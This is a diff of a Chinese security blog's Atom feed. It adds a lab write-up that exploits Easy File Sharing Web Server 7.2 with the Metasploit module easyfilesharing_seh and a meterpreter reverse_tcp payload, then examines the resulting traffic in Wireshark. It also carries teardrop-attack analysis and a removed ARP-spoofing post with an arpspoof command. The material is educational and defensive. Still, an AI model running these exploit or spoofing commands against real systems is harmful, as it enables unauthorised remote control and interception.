@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://zer0-nu1l.github.io/"/>
-  <updated>2020-07-02T14:05:44.573Z</updated>
+  <updated>2020-07-05T12:32:17.525Z</updated>
   <id>https://zer0-nu1l.github.io/</id>
   
   <author>
@@ -17,11 +17,40 @@
   <generator uri="https://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>【Wireshark 系列】缓冲区溢出攻击分析</title>
+    <link href="https://zer0-nu1l.github.io/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/"/>
+    <id>https://zer0-nu1l.github.io/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/</id>
+    <published>2020-07-05T12:25:09.000Z</published>
+    <updated>2020-07-05T12:32:17.525Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/Wireshark.jpg" alt="Wireshark"></p><p>前面介绍了很多种攻击方式，但是它们都是基于网络协议的缺陷。而在实际情况中，除了这些内容之外，操作系统和应用程序的漏洞也是网络安全研究的重点。<br>缓冲区溢出是现在很典型的一种远程攻击方式，它利用了程序员在编写程序时的疏忽，从而实现了在远程设备上执行代码。这些攻击方式大都要通过应用层的协议实现，所以本次课也会介绍应用层最为典型的协议 HTTP 。</p><a id="more"></a><h1>缓冲区溢出攻击的相关理论</h1><p>缓冲区溢出是一种非常普遍、非常危险的漏洞，在各种操作系统、应用软件中广泛存在。利用缓冲区溢出进行攻击，可以导致程序运行失败、系统宕机、重新启动等后果。更为严重的是，攻击者可以利用它执行非授权指令，甚至可以取得系统特权，进而执行各种操作。</p><p>考虑到目前大量的应用程序都使用了 B/S 结构，而这种结构正是使用 HTTP 协议进行通信的。</p><p>维基百科的定义是：<br>缓冲区溢出（buffer overflow），是针对程序设计缺陷，向程序输入缓冲区写入使之溢出的内容（通常是超过缓冲区能保存的最大数据量的数据），从而破坏程序运行、趁著中断之际并获取程序乃至系统的控制权。</p><blockquote><p>HTTP 协议下有一个 Host 字段，这个不是多余的，主要是虚拟化技术的发展，一台主机很可能对应多个域名。</p></blockquote><h1>模拟缓冲区溢出攻击</h1><h2 id="实验环境">实验环境</h2><blockquote><p>笔者的 8GB 主机基本要把所有的进程关闭 😭</p></blockquote><p>kali：192.168.93.144<br>Win7：192.168.93.155<br>Wireshark 监听端口 VNet8<br>文件共享软件 Easy File Sharing Web Server7.2</p><h2 id="实验步骤">实验步骤</h2><h3 id="开启服务">开启服务</h3><p>在 Win 7 下运行 文件共享软件 Easy File Sharing Web Server7.2：<br><img src="/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image001.png" alt></p><p>开启服务之后，另一台主机 kali 是可以访问的：</p><p><img src="/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image002.png" alt></p><h3 id="缓冲区溢出攻击">缓冲区溢出攻击</h3><p>在 kali 中执行 msfconsole 命令打开 Metasploit：<br><img src="/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image003.png" style="zoom:80%;"></p><p>Metasploit 是各种渗透模块的集成，先搜索一下没有没目标软件的渗透模块：<br><img src="/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image004.png" alt></p><p>我们不妨使用 2015 版的：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/http/easyfilesharing_seh</span><br></pre></td></tr></table></figure><p>然后进行攻击</p><ol><li><p>选择武器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set payload windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure></li><li><p>自我定位</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set lhost 192.168.93.144</span><br></pre></td></tr></table></figure></li><li><p>目标定位</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set rhost 192.168.93.155</span><br><span class="line">set rport 80</span><br></pre></td></tr></table></figure></li><li><p>攻击<br>发送大量数据，包括木马等，实现缓冲区溢出</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure><p><img src="/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/image-20200705203002353.png" alt="image-20200705203002353"></p></li></ol><p>这个时候已经实现了对 Win7 的控制。</p><h3 id="控制">控制</h3><p>接下来可以把 Win7 当做自己的主机进行控制：<br><img src="/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image006.png" alt></p><p><img src="/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image007.png" alt></p><h1>使用 Wireshark 分析缓冲区溢出攻击</h1><h2 id="判定攻击">判定攻击</h2><p>如果我们怀疑自己中了缓冲区溢出攻击，可以进行如下分析：<br>分析 <a href="https://github.com/ZER0-Nu1L/Wireshark-Analysis/tree/master/Package/Buffer_Overflow.pcapng" target="_blank" rel="noopener">Buffer_Overflow.pcapng</a>：</p><p>先用显示过滤器过滤一下，只显示 http 相关的报文（客户端进行缓冲区溢出攻击的应用层协议）<br><img src="/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/image-20200705203021763.png" alt></p><p>首先 Wireshark 已经看出来这里是一个畸形的数据包。并且，HTTP 数据包进行了分片，这往往是字段内容过大导致的，也是实现缓冲区溢出攻击的必要条件之一。</p><p>我们可以用 TCP 在追踪流查看一下：<br><img src="/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image009.png" alt></p><p>可以很明显地看出 GET 后面的内容是混乱的， 没有没有实际意义可言，并且有很长很长一大段全是字符。<br>这很显然是为了将软件的缓冲区填满。</p><h2 id="一个疑点的分析">一个疑点的分析</h2><p>值得一提的是，如果你尝试在 Easy File Sharing Web Server 页面填写内容的时候，会发现自己输出长度是有限的，那怎么会导致溢出呢？<br><img src="/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image010.png" alt><br>这一点其实并不难理解，这个功能实现往往是前端页面对用户输入的限制。但是传输的时候没有限制，比如通过 Socket 编程传递这样过长的参数。<br>再补充一下，我们这里是用 Metasploit 中的模块实现对软件的攻击，也就意味着这个漏洞是公开知晓的。但是自己去挖漏洞的时候，就需要自己用诸如 Socket 编程的方式进行攻击。</p><p>所以这里的软件是有问题的，漏洞在于不检查接收的数据有多长，只是在前端做了输入限制。<br>当传出的数据大于 TCP 的缓冲区，就会复制到缓冲区的外面，通俗地讲就是指向下一条要执行指令的指针（PC）指针。导致之后执行的时候，不是执行下一条程序，而是执行下一个木马。</p><h2 id="缓冲区大小">缓冲区大小</h2><p>程序缓冲区有多大，这个是一个非常非常关键的问题，对不同的人都有非常重要的意义。<br>黑客知晓之后，就可以进行攻击了，在缓冲区之外的加上木马文件，构造缓冲区溢出攻击；<br>安全工作者知晓之后，可以进行木马识别和网络取证等。</p><p>而我们这里其实也可以看到：<br><img src="/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image009.png" alt><br><img src="/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image011.png" style="zoom:50%;"></p><p>这个程序的缓冲区大小为：4061 bytes.</p><h2 id="反向木马">反向木马</h2><p>按照木马客户端和服务端之间建立连接的方式的不同，可以将木马分为正向连接木马和反向连接木马。</p><p>正向连接木马的连接过程为：控制端首先发起通信连接的请求，然后木马被控制端响应并建立半连接，等控制端响应后，木马被控制端最终建立一个与控制端的通信连接。<br>正向木马其实是比较困难，黑客不知道哪些主机中了木马，而中了木马的主机等待着黑客连接它。</p><p>再加上由于动态IP、防火墙过滤技术、内网访问限制等因素的存在，阻挡了许多木马的交互，使得中了木马的计算机无法与控制端联系。这样，反向连接方式就显得非常必要。</p><p>进一步说，灰鸽子木马之后，常见的木马基本上都是反向木马。</p><p>其连接过程是：控制端首先打开端口进行监听，被控制端主动与控制端的监听端口进行连接。木马控制端发现被控制端请求之后给出提示，然后控制者开始对被控制端主机进行控制操作。</p><p>我们分析一下这里是不是反向木马。<br>这里的服务器 IP 是 192.168.93.155，所以先用一次显示过滤器：<br>ip.src == 192.168.93.155<br>看到有一个它主动发出的 SYN 请求：<br><img src="/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/image-20200705203053290.png" alt="image-20200705203053290"></p><p>去掉显示过滤器，可以看到服务器主动和另一台主机进行 TCP 三次握手：<br><img src="/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image013.png" alt></p><p>所以这里攻击者使用的是反向木马。</p><h2 id="应对措施">应对措施</h2><p>如果你使用的软件存在这样的漏洞，但你又不得不使用这个软件，可以这样应对：<br>把特征写入入侵检测的特征库里，比如我们这里的特征是： HTTP GET请求, 缓冲区长度为 4061 bytes…</p><h1>参考资料</h1><ol><li><a href="http://www.cnitpm.com/pm1/66204.html" target="_blank" rel="noopener">正向连接</a></li><li><a href="http://www.cnitpm.com/pm1/66205.html" target="_blank" rel="noopener">反向连接</a></li><li><a href="https://zh.wikipedia.org/wiki/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA" target="_blank" rel="noopener">缓冲区溢出</a></li></ol>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;img src=&quot;/2020/07/05/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/Wireshark.jpg&quot; alt=&quot;Wireshark&quot;&gt;&lt;/p&gt;
+&lt;p&gt;前面介绍了很多种攻击方式，但是它们都是基于网络协议的缺陷。而在实际情况中，除了这些内容之外，操作系统和应用程序的漏洞也是网络安全研究的重点。&lt;br&gt;
+缓冲区溢出是现在很典型的一种远程攻击方式，它利用了程序员在编写程序时的疏忽，从而实现了在远程设备上执行代码。这些攻击方式大都要通过应用层的协议实现，所以本次课也会介绍应用层最为典型的协议 HTTP 。&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="Web" scheme="https://zer0-nu1l.github.io/categories/Web/"/>
+    
+      <category term="Wireshark" scheme="https://zer0-nu1l.github.io/categories/Web/Wireshark/"/>
+    
+    
+      <category term="kali" scheme="https://zer0-nu1l.github.io/tags/kali/"/>
+    
+      <category term="Wireshark" scheme="https://zer0-nu1l.github.io/tags/Wireshark/"/>
+    
+  </entry>
+  
+  <entry>
     <title>【Wireshark 系列】泪滴攻击分析</title>
     <link href="https://zer0-nu1l.github.io/2020/07/02/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E6%B3%AA%E6%BB%B4%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/"/>
     <id>https://zer0-nu1l.github.io/2020/07/02/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E6%B3%AA%E6%BB%B4%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/</id>
     <published>2020-07-02T13:04:12.000Z</published>
-    <updated>2020-07-02T14:05:44.573Z</updated>
+    <updated>2020-07-05T12:34:33.884Z</updated>
     
     <content type="html"><![CDATA[<p><img src="https://www.zer0-nu1l.com/uploads/Wireshark.jpg" alt="Wireshark"></p><p>针对 IP 协议的攻击方法，主要有<u>伪造 IP 地址</u>和发送<u>畸形数据包</u>两种方式。<br>泪滴攻击就属于发送畸形数据包这种方式，它的设计思路巧妙地利用了 IP 协议里面的缺陷，因此成为了网络安全里面的一个经典案例。<br>这种攻击的实现原理是向目标主机发送异常的数据包碎片，使得 IP 数据包碎片在重组的过程中有重合的部分，从而导致目标系统无法对其进行重组，进一步导致系统崩溃而停止服务的恶性攻击。</p><p>这篇内容非常非常简单 😅</p>  <a id="more"></a><h1>IPv4 报文分析</h1><blockquote><p>考虑到这种攻击是建立在 IP 协议上，我们先来简单地了解一下 IP 协议的几个重要内容，包括 IP 协议数据包的格式、分片方式以及存活时间（TTL）。</p></blockquote><h2 id="IP-协议格式">IP 协议格式</h2><img src="/2020/07/02/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E6%B3%AA%E6%BB%B4%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/image-20200702211114219.png" alt="image-20200702211114219" style="zoom:67%;"><p>在数据包信息面板中查看它的详细信息，这个数据包各部分如下。<br>（1）版本——占 4 位，指 IP 协议的版本目前的 IP 协议版本号为 4（即 IPv4）。<br>（2）首部长度——占 4 位，这里的值为 20Bytes。<br>（3）总长度的是 56 字节。<br><u><strong>（4）标识（identification）——占 16 位，它是一个计数器，用来产生数据包的标识。</strong></u><br><u><strong>（5）片偏移（Flags, 16 位）——较长的分组在分片后某片在原分组中的相对位置，片偏移以8 个字节为偏移单位。</strong></u><br><u><strong>（6）生存时间（8 位）——记为 TTL（Time To Live），表示数据包在网络中可通过的路由器数的最大值。</strong></u><br>（7）协议（8 位）字段——指出此数据包携带的数据使用何种协议以便目的主机的 IP 层将数据部分上交给哪个处理进程。<br>（8）源 IP 地址，表示数据包从哪里发出。<br>（9）目的 IP 地址，表示数据包将要发向哪里。</p><blockquote><p>其中我们比较关心的是 Flags、TTL、Src、Dst</p></blockquote><h2 id="IP-分片">IP 分片</h2><p>我们知道之所以要对 IP 数据包进行分片，是因为存在 MTU（最大传输单元）<br>由于以太网传输电气方面的限制，以太网帧的大小都有限制每个以太网帧最小也要 64 Bytes，最大不能超过 1518 Bytes。<br>刨去以太网帧的帧头（DMAC 6 Bytes + SMAC 6 Bytes+Type 2 bytes）14 Bytes 和帧尾 CRC 校验部分 4 Bytes（这个部分有时候也被称作 FCS），那么剩下承载上层协议的地方也就是 Data 域最大就只能有 1500 Bytes，这个值我们就把它称之为 MTU。这也就是我们几乎所有设备的 MTU 值都为 1500 字节的原因。<br>所以当我们要传输的信息大小超过 1500 字节的时候，就需要分片。</p><h2 id="IP-包的-Flags">IP 包的 Flags</h2><p>由同一个信息拆开的报文，他们的标识 identification 是一样的。<br>比如这里的第 8、9 报文的标志是一样的<br><img src="/2020/07/02/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E6%B3%AA%E6%BB%B4%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image002.png" alt></p><p>Flags 前两位好像没什么用，第三位 More fragment，如果是1，表示后面还有，如果为0，表示为最后一个数据包。后面 13 位 Fragment offset 表示偏移量。<br>以 <a href="https://github.com/ZER0-Nu1L/Wireshark-Analysis/blob/master/Package/ping.pcapng" target="_blank" rel="noopener">ping.pcapng</a> 为例：<br>第二个数据包的偏移量为第一个数据包的数据长度<br>（数据长度=整个包的长度-以太网帧头-IP帧头）<br><img src="/2020/07/02/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E6%B3%AA%E6%BB%B4%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image003.png" alt></p><p>1514 - 14 - 20 = 1480 bytes</p><blockquote><p>如果忘记帧头大小，可以点击帧，然后在状态栏查看：</p></blockquote><img src="/2020/07/02/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E6%B3%AA%E6%BB%B4%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image004.png" style="zoom: 67%;"><p>第二个包的偏移量：<br><img src="/2020/07/02/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E6%B3%AA%E6%BB%B4%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image005.png" style="zoom:67%;"></p><p>后面几个包也是类似的。</p><h1>泪滴攻击</h1><h2 id="泪滴攻击原理">泪滴攻击原理</h2><p>泪滴攻击是基于数据分片传送进行的攻击手段。<br>在 IP 报头中有一个偏移字段和一个分片标志（MF, More fragments），如果 MF 标志设置为 1，则表明这个 IP 包是一个大 IP 包的片断，其中偏移字段指出了这个片断在整个 IP 包中的位置。例如，对一个 4200Bytes 的 IP包进行分片（MTU 为 1480），则 3 个片断中偏移字段的值依次为：0、1480、2960。这样接收端就可以根据这些信息成功的组装该 IP 包。而如果一个攻击者打破这种正常情况，把偏移字段设置成不正确的值，即可能出现重合或断开的情况，就可能导致目标操作系统崩溃。比如，把上述偏移设置为 0、1000、2000。<br>图中阴影部分的就是两个数据包有重合的地方，目标设备在接收到这种分片之后就无法重新组合成一个数据包，这就是所谓的泪滴攻击。<br><img src="/2020/07/02/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E6%B3%AA%E6%BB%B4%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/image-20200702211747039.png" alt="image-20200702211747039"></p><p>这种攻击方式在以前曾经给计算机用户带来了很大的困扰，但是对如今的操作系统基本无效，只是有时攻击者会将其与泛洪相结合来作为一种攻击手段。</p><h1>分析泪滴攻击</h1><p><a href="https://github.com/ZER0-Nu1L/Wireshark-Analysis/blob/master/Package/Teardrop.pcapng" target="_blank" rel="noopener">teardrop.pcap</a></p><h2 id="概览">概览</h2><p>这个数据包看起来没有特别明显问题，但是点到第9个包的时候，就能看到很明显的问题：<br><img src="/2020/07/02/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E6%B3%AA%E6%BB%B4%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image001.png" alt></p><p>它伪造了 Length，和长度相关的，会想到是泪滴攻击。</p><h2 id="分析">分析</h2><p>查看到它的 Fragment offset: 24<br>而我们查看 8 的数据包的数据长度：36<br><img src="/2020/07/02/%E3%80%90Wireshark%20%E7%B3%BB%E5%88%97%E3%80%91%E6%B3%AA%E6%BB%B4%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90/clip_image002-1593695935789.png" style="zoom:50%;"></p><p>确定是泪滴攻击。<br>结束。</p><blockquote><p>是不是有点意犹未尽 😅</p></blockquote>]]></content>
     
@@ -297,9 +326,9 @@
       <category term="bug" scheme="https://zer0-nu1l.github.io/categories/Development/bug/"/>
     
     
-      <category term="VSCode" scheme="https://zer0-nu1l.github.io/tags/VSCode/"/>
-    
       <category term="Error" scheme="https://zer0-nu1l.github.io/tags/Error/"/>
+    
+      <category term="VSCode" scheme="https://zer0-nu1l.github.io/tags/VSCode/"/>
     
       <category term="IDE" scheme="https://zer0-nu1l.github.io/tags/IDE/"/>
     
@@ -371,9 +400,9 @@
       <category term="Crypto" scheme="https://zer0-nu1l.github.io/categories/CTF/Crypto/"/>
     
     
-      <category term="Crypto" scheme="https://zer0-nu1l.github.io/tags/Crypto/"/>
-    
       <category term="Error" scheme="https://zer0-nu1l.github.io/tags/Error/"/>
+    
+      <category term="Crypto" scheme="https://zer0-nu1l.github.io/tags/Crypto/"/>
     
   </entry>
   
@@ -632,36 +661,6 @@
     
     
       <category term="SDN" scheme="https://zer0-nu1l.github.io/tags/SDN/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>ARP 欺骗的实现和防御</title>
-    <link href="https://zer0-nu1l.github.io/2019/10/26/ARP/"/>
-    <id>https://zer0-nu1l.github.io/2019/10/26/ARP/</id>
-    <published>2019-10-26T04:27:00.000Z</published>
-    <updated>2020-01-25T09:12:37.052Z</updated>
-    
-    <content type="html"><![CDATA[<h1>VMWare 网络基础知识</h1><blockquote><p>要进入或离开全屏模式，请按Ctrl+Alt+Enter。<br>要切换到前一个全屏虚拟机，请按Ctrl+Alt+向左箭头键。<br>要切换到下一个全屏虚拟机，请按Ctrl+Alt+向右箭头键。</p></blockquote><h2 id="概览">概览</h2><p>虚拟机虚拟了连接的硬件设备（如CD、声卡、打印机等），同时还虚拟了网络配置设备（如 DHCP 服务器，虚拟网络） - VMnet8, VMnet1; VMnet0 虚拟网络。<br>可以 Windows 系统（主机）控制面板下的 <code>网络和 Internet\网络连接</code> 查看。</p><p>VMnet8 - NAT：<br><img src="/2019/10/26/ARP/ifconfig_ipconfig.png" width="800"></p><h2 id="虚拟机网络配置及原理">虚拟机网络配置及原理</h2><p>VMWare提供了三种工作模式：bridged(桥接模式)、NAT(网络地址转换模式)和host-only(主机模式)。</p><h3 id="bridged-桥接模式">bridged(桥接模式)</h3><p>在桥接模式下，VMWare虚拟出来的操作系统就像是局域网中的一台独立的主机，它可以访问网内任何一台机器。<br>在桥接模式下，你需要手工为虚拟系统配置IP地址、子网掩码，而且还要和宿主机器处于同一网段，这样虚拟系统才能和宿主机器进行通信。<br>同时，由于这个虚拟系统是局域网中的一个独立的主机系统，那么就可以手工配置它的TCP/IP配置信息，以实现通过局域网的网关或路由器访问互联网。</p><blockquote><p>如果你想利用VMWare在局域网内新建一个虚拟服务器，为局域网用户提供网络服务，就应该选择桥接模式。</p></blockquote><h3 id="host-only-主机模式">host-only(主机模式)</h3><p>在某些特殊的网络调试环境中，要求将真实环境和虚拟环境<strong>隔离</strong>开，这时你就可采用host-only模式。在host-only模式中，所有的虚拟系统是可以相互通信的，但虚拟系统和真实的网络是被隔离开的。<br>在host-only模式下，虚拟系统和宿主机器系统是可以相互通信的，相当于这两台机器通过双绞线互连。</p><p>在host-only模式下，虚拟系统的 TCP/IP 配置信息(如IP地址、网关地址、DNS服务器等)，都是由 VMnet1(host-only) 虚拟网络的 DHCP 服务器来动态分配的。</p><blockquote><p>如果想利用VMWare创建一个与网内其他机器相隔离的虚拟系统，进行某些特殊的网络调试工作，可以选择host-only模式。</p></blockquote><h3 id="NAT-网络地址转换模式">NAT(网络地址转换模式)</h3><p>使用NAT模式，就是让虚拟系统借助 NAT(网络地址转换)功能，通过宿主机器所在的网络来访问公网。也就是说，使用NAT模式可以实现在虚拟系统里访问互联网。NAT模式下的虚拟系统的 TCP/IP 配置信息是由 VMnet8 (NAT) 虚拟网络的 DHCP 服务器提供的，无法进行手工修改，因此虚拟系统也就无法和本局域网中的其他真实主机进行通讯。采用NAT模式最大的优势是虚拟系统接入互联网非常简单，你不需要进行任何其他的配置，只需要宿主机器能访问互联网即可。</p><blockquote><p>如果你想利用VMWare安装一个新的虚拟系统，在虚拟系统中不用进行任何手工配置就能直接访问互联网，建议你采用NAT模式。</p></blockquote><p>提示:以上所提到的NAT模式下的VMnet8虚拟网络，host-only模式下的VMnet1虚拟网络，以及bridged模式下的VMnet0虚拟网络，都是由VMWare虚拟机自动配置而生成的，不需要用户自行设置。VMnet8和VMnet1提供DHCP服务，VMnet0虚拟网络则不提供(图1)</p><p>正常的网络配置有点类似的，如果动态分配的不行，就得手动分配，但是目的不同。</p><p>VMnet0表示的是用于桥接模式下的虚拟交换机；VMnet1表示的是用于仅主机模式下的虚拟交换机；VMnet8表示的是用于NAT模式下的虚拟交换机。</p><h2 id="配置-VMWare-的网络（桥接）">配置 VMWare 的网络（桥接）</h2><blockquote><p>结合上面的基础知识易得：在实际应用中，桥接的价值还是其中较高的一种。<br>如果是在利用虚拟机学习新的操作系统的话，桥接其实并不是一种友好的网络配置。如果用 kali 做渗透测试等等的时候，建议使用桥接。</p></blockquote><h3 id="一个经验">一个经验</h3><p>最开始照搬博客的时候出现的问题：“vim中 E212：无法打开并写入文件”<br>特权模式下都没办法写入数据的可能性：文件夹、文件不存在……<br>这样出现的问题往往不能通过搜索引擎解决。</p><h3 id="补充">补充</h3><p>主要参照：<a href="https://blog.csdn.net/gw_csdn/article/details/84992696" target="_blank" rel="noopener">解决kali桥接模式无法上网</a>，这篇写的非常好。<br>需要补充说明的有：</p><ol><li>文章中所谓的路由器 IP 就是 网关。（路由器 IP 这样的表示感觉有点偏口语），</li><li><code>dhclient</code> 命令使用动态主机配置协议动态的配置网络接口的网络参数。<br>由于在 <code>/etc/network/interfaces</code> 中，博主配置的是<code>iface lo inet dhcp</code>，也就是动态分配 IP，所以需要用 <code>dhclient</code> 命令进行动态分配。</li></ol><p>参考多个教程，整体配置逻辑为：</p><ol><li>VMWare 的虚拟网络编辑器（在菜单栏的编辑下）里更改设置，桥接到对应的端口（如果是无线的，可以接到 Intel®Dual Band Wireless-AC 7265），如果只有一个网卡，自动也没有关系。</li><li>对特定的虚拟机的网络适配器进行更改，复制物理网络连接状态有人推荐不要勾选。</li><li>以及用命令去对操作系统的网络进行配置，查看方法如下： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># cat /etc/resolv.conf</span></span><br><span class="line"><span class="comment"># Generated by NetworkManager</span></span><br><span class="line">nameserver 8.8.8.8</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># cat /etc/network/interfaces</span></span><br><span class="line"><span class="comment"># This file describes the network interfaces available on your system</span></span><br><span class="line"><span class="comment"># and how to activate them. For more information, see interfaces(5).</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># source /etc/network/interfaces.d/*</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># The loopback network interface</span></span><br><span class="line">auto etho</span><br><span class="line">iface lo inet dhcp</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># dhclient eth0</span></span><br></pre></td></tr></table></figure></li></ol><h1>APR 欺骗</h1><h2 id="ARPSPOOF-攻击实现">ARPSPOOF 攻击实现</h2><h3 id="ARP-欺骗简介">ARP 欺骗简介</h3><p>APRSPOOF 欺骗：一种中间人攻击，攻击者通过毒化受害者的 ARP 缓存，将网关的MAC 替换成攻击者的MAC ，于是攻击者的主机实际上就充当了受害主机的网关，之后攻击者就可以截获受害者发出和接到的数据包，从中获取账号密码、银行卡信息等，也可以实现断网操作。</p><h3 id="攻击前提">攻击前提</h3><pre><code>1. 局域网（内网）2. 内网未进行处理（建议用手机热点或者宿舍wifi 进行操作）</code></pre><p>（使用桥接，一开始使用net 连接操作不成功，可能是net连接中物理机相当于路由器中转数据，虚拟机和主机不在同一个网段）</p><p>HP:     113.54.230.118<br>Kali:   113.54.230.110</p><p>想要得到主机的IP可以用kali里面的nmap进行扫描，我们这里为了方便直接打开windows的cmd，输入ipconfig指令得到物理机的ip：<br>fping指令来扫描当前网段内的所有IP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i 网卡 -t B的IP  当前局域网网关</span><br></pre></td></tr></table></figure><p>// i-&gt; inet; t -&gt; target<br>当前网络的端口通过<code>ifconfig</code>查看</p><blockquote><p>（-i 指定接口 interface ，-t 指定目标 target）</p></blockquote><figure class="highlight bash"><table><tr><td 